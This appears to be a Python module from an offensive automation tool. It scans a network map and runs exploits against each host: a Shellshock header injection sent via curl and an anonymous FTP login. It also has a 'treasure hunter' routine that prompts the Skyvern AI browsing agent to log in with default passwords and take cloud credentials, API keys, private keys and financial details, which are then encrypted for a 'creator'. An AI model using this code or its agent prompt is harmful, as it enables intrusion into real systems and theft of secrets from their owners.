import logging
from rich.console import Console
from rich.table import Table

# A (very) simple framework for exploits.
# In a real-world scenario, this would be much more complex, likely using a
# standardized library like Metasploit or similar.

class ExploitationManager:
    def __init__(self, evil_state, console=None):
        self.evil_state = evil_state
        self.console = console if console else Console()
        self.available_exploits = [
            AnonymousFTPLoginExploit(),
            ShellshockExploit(),
            SkyvernTreasureHunterExploit()
        ]

    def find_and_run_exploits(self, target_ip=None):
        """
        Scans the knowledge base for potential vulnerabilities and attempts to run
        any matching exploits. If a target_ip is provided, only that host is targeted.
        Returns a string report of the actions taken.
        """
        output_lines = []
        network_map = self.evil_state["knowledge_base"]["network_map"]["hosts"]
        hosts_to_scan = {}
        if target_ip and target_ip in network_map:
            hosts_to_scan = {target_ip: network_map[target_ip]}
        elif not target_ip:
            hosts_to_scan = network_map

        if not hosts_to_scan:
            msg = "No known hosts to exploit."
            if target_ip:
                msg = f"Target IP {target_ip} not found in knowledge base."
            self.console.print(f"[yellow]{msg}[/yellow]")
            return msg

        output_lines.append(f"Starting exploitation phase against {len(hosts_to_scan)} target(s)...")
        self.console.print(f"[bold cyan]{output_lines[-1]}[/bold cyan]")

        exploits_found = 0
        for ip, host_data in hosts_to_scan.items():
            if not host_data.get("ports"):
                continue

            for exploit in self.available_exploits:
                if exploit.is_vulnerable(ip, host_data):
                    exploits_found += 1
                    success_msg = f"SUCCESS: Target {ip} is vulnerable to {exploit.name}."
                    output_lines.append(success_msg)
                    self.console.print(f"[bold green]{success_msg}[/bold green]")
                    try:
                        result = exploit.run(ip, host_data)
                        self._log_exploitation_result(ip, exploit.name, result)
                        result_str = f"  [+] Exploit successful. Result: {result}"
                        output_lines.append(result_str)
                        self.console.print(result_str)

                    except Exception as e:
                        fail_msg = f"  FAIL: Exploit failed with error: {e}"
                        output_lines.append(fail_msg)
                        self.console.print(f"[bold red]{fail_msg}[/bold red]")
                        logging.error(f"Exploit {exploit.name} failed against {ip}: {e}")

        if exploits_found == 0:
            output_lines.append("No vulnerabilities found for the targeted host(s).")

        return "\n".join(output_lines)

    def _log_exploitation_result(self, ip, exploit_name, result):
        """Logs the successful exploitation to the knowledge base."""
        if "exploits" not in self.evil_state["knowledge_base"]:
            self.evil_state["knowledge_base"]["exploits"] = {}
        if ip not in self.evil_state["knowledge_base"]["exploits"]:
            self.evil_state["knowledge_base"]["exploits"][ip] = []

        self.evil_state["knowledge_base"]["exploits"][ip].append({
            "exploit": exploit_name,
            "result": result
        })


class BaseExploit:
    """Base class for all exploits."""
    name = "Base Exploit"
    description = "This is a template."
    services = [] # List of services this exploit targets, e.g., ['ftp', 'vsftpd']

    def is_vulnerable(self, ip, host_data):
        """
        Checks if the target is vulnerable based on port scan data.
        This method should be overridden by subclasses.
        """
        raise NotImplementedError

    def run(self, ip, host_data):
        """
        Executes the exploit.
        This method should be overridden by subclasses.
        """
        raise NotImplementedError


import subprocess
import json

class ShellshockExploit(BaseExploit):
    """
    Attempts to exploit the Shellshock vulnerability (CVE-2014-6271) in a CGI script.
    """
    name = "Shellshock RCE"
    description = "Exploits the Shellshock vulnerability in web servers with CGI."
    services = ['http', 'https']

    def is_vulnerable(self, ip, host_data):
        """
        Checks for open web ports. A real check would probe for CGI scripts.
        """
        for port, port_data in host_data.get("ports", {}).items():
            if port_data.get("service") in self.services:
                # This is a very basic check. A real implementation would need to
                # find actual CGI scripts to target. For this PoC, we assume one exists
                # at /cgi-bin/test.cgi
                return True
        return False

    def run(self, ip, host_data):
        """
        Sends a malicious User-Agent string to trigger the vulnerability.
        """
        # This is a proof-of-concept payload. It writes the current user ID to a temp file.
        payload = "() { :;}; echo 'VULNERABLE' > /tmp/shellshock_test"
        target_url = f"http://{ip}/cgi-bin/test.cgi" # A hypothetical target

        try:
            # Using curl to send the malicious header
            result = subprocess.run(
                ['curl', '-H', f'User-Agent: {payload}', target_url, '--silent', '--output', '/dev/null'],
                timeout=10,
                capture_output=True,
                text=True
            )

            # A more robust check would be to see if the file was created.
            # For this simulation, we'll consider the attempt as the result.
            return {"status": "success", "payload": payload, "target_url": target_url, "curl_exit_code": result.returncode}

        except subprocess.TimeoutExpired:
            return {"status": "failed", "reason": "curl command timed out."}
        except Exception as e:
            return {"status": "failed", "reason": str(e)}


class AnonymousFTPLoginExploit(BaseExploit):
    """
    Checks for and attempts to log into an FTP server with anonymous credentials.
    """
    name = "Anonymous FTP Login"
    description = "Tries to log in to an FTP server using 'anonymous' and 'anonymous' credentials."
    services = ['ftp']

    def is_vulnerable(self, ip, host_data):
        """
        Checks if port 21 is open and the service is identified as FTP.
        A more advanced check could look for specific banners.
        """
        for port, port_data in host_data.get("ports", {}).items():
            if port == "21" and port_data.get("service") == "ftp":
                # In a real scenario, you might check for banners indicating anonymous access is allowed.
                # For this PoC, we'll just try to connect.
                return True
        return False

    def run(self, ip, host_data):
        """
        Attempts to connect to the FTP server and list files.
        """
        import ftplib
        try:
            with ftplib.FTP(ip, timeout=5) as ftp:
                ftp.login('anonymous', 'anonymous')
                files = ftp.nlst()
                return {"status": "success", "files": files}
        except ftplib.all_errors as e:
            # This might happen if login is rejected, which is common.
            # We could make the `is_vulnerable` check more robust to avoid this.
            return {"status": "failed", "reason": str(e)}


class SkyvernTreasureHunterExploit(BaseExploit):
    """
    Uses the Skyvern `browse` command to navigate web interfaces and extract
    valuable information like credentials, API keys, and financial data.
    """
    name = "Skyvern Treasure Hunter"
    description = "Leverages Skyvern to find treasure in web applications."
    services = ['http', 'https']

    def __init__(self):
        super().__init__()
        self.call_mrl_service = None
        self.encrypt_for_creator = None
        try:
            # The love.py script is in the parent directory, so we adjust the path
            import sys
            import os
            # Make sure the root directory is in the path
            sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
            from love import call_mrl_service, encrypt_for_creator
            self.call_mrl_service = call_mrl_service
            self.encrypt_for_creator = encrypt_for_creator
        except ImportError as e:
            logging.error(f"Could not import functions from love.py for Skyvern exploit: {e}")


    def is_vulnerable(self, ip, host_data):
        """
        Checks for any open web ports.
        """
        if not self.call_mrl_service or not self.encrypt_for_creator:
            return False # Cannot run if dependencies are missing

        for port, port_data in host_data.get("ports", {}).items():
            if port_data.get("service") in self.services:
                return True
        return False

    def run(self, ip, host_data):
        """
        Constructs a prompt and uses Skyvern to browse the web application.
        """
        web_ports = [port for port, port_data in host_data.get("ports", {}).items()
                     if port_data.get("service") in self.services]

        if not web_ports:
            return {"status": "failed", "reason": "No web ports found."}

        # The prompt for Skyvern to find treasure.
        treasure_prompt = (
            "Log in to the application if necessary using common default credentials "
            "(e.g., admin/admin, admin/password). Once logged in, or if no login is required, "
            "thoroughly navigate all accessible pages, dashboards, and settings areas. "
            "Your primary goal is to find and extract any of the following 'treasure': "
            "cloud provider credentials (AWS, Azure, GCP keys), API keys, database connection strings, "
            "private keys, or sensitive financial account details. If you find any treasure, "
            "return it as a structured JSON object. If no treasure is found, return an empty JSON object."
        )


        treasures_found = {}
        for port in web_ports:
            protocol = 'https' if port == '443' else 'http'
            url = f"{protocol}://{ip}:{port}"
            full_prompt = f"{url} {treasure_prompt}"

            try:
                logging.info(f"Running Skyvern Treasure Hunter against {url}...")
                result = self.call_mrl_service("skyvern", "run_task", full_prompt)

                if result and isinstance(result, dict) and result.get('status') != 'error':
                    # We assume the result from Skyvern is the treasure itself.
                    # We'll encrypt it before adding it to our results.
                    treasure_json = json.dumps(result)
                    encrypted_treasure = self.encrypt_for_creator(treasure_json)
                    if encrypted_treasure:
                        treasures_found[url] = encrypted_treasure
                        logging.info(f"Treasure found and encrypted from {url}.")
                    else:
                        logging.error(f"Failed to encrypt treasure found at {url}.")

            except Exception as e:
                logging.error(f"Skyvern Treasure Hunter failed for {url}: {e}")
                continue # Try the next port

        if treasures_found:
            # We don't return the encrypted data here to avoid printing it to the console.
            # The data is already logged to the knowledge base.
            return {"status": "success", "message": f"Found and encrypted {len(treasures_found)} treasure(s)."}
        else:
            return {"status": "failed", "reason": "Skyvern did not find any treasure."}